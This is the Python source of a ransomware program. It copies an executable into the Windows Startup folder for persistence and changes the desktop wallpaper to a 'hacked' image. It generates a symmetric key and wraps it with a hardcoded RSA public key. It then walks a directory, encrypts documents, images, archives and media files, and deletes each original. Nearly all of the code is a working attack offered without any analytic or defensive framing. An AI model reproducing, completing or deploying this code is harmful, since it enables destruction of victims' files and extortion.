from cryptography.fernet import Fernet
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
import os
import Ransomware as r
import ctypes
import shutil


#To startup
try:
    pth = os.path.expanduser('~')
    src = os.path.join(pth,'Desktop\\Bin\\Ransomware\\sendFile.exe')
    dst = os.path.join(pth,'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup')
    shutil.copy(src,dst)

except:
    pass



def change_wallpaper(path):
    ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
    

def encrypt(path):
    try:
        change_wallpaper(r'C:\Users\k4li\Desktop\Malwares\Ransomware\hacked.bmp')
    except:
        pass
    
    key = Fernet.generate_key()

    pub_pem = """-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCM5PWv1gFLUv4xjcjeavgcVe9p
a0kZlqw/+y7/d7AdZRSHY4sC7shQAtJlN4YBoEJq7OqELejEjo7aLVEs+wWU3lGH
2O9BvRV42ttyUKKdl03l4gqewYiELhyxoK/1VOXz3PU+lRuSeq1OXes+SvM5Og/4
Aof/HtBcs3cSou96swIDAQAB
-----END PUBLIC KEY-----
    """
    pub_key = RSA.importKey(pub_pem)
    encryptor = PKCS1_OAEP.new(key=pub_key)
    encrypted_sym_key = encryptor.encrypt(key)

    with open(kpath, "wb") as file:
        file.write(encrypted_sym_key)

    print(key)

    rw = r.Ransomeware(key)

    file_ext = [".txt",".pdf",".png",".jpg",".docx",".doc",".xls",".ppt",".pptx",".rar",".zip",".mp3",".wmv",".mp4"]

    for cp, dir_n, file in os.walk(path):
        for i in file:
            ext = os.path.splitext(i)
            if ext[1] in file_ext:
                with open(cp+"/"+i, "rb") as f:
                    data = f.read()

                cipher = rw.encrypt_data(data)

                with open(cp+"/"+i+".encrypted", "wb") as f:
                    f.write(cipher)

                os.remove(cp+"/"+i)



host = os.path.expanduser('~')
path = os.path.join(host,'Desktop','Test')
kpath = os.path.join(host,'Desktop','key.txt')

encrypt(path)
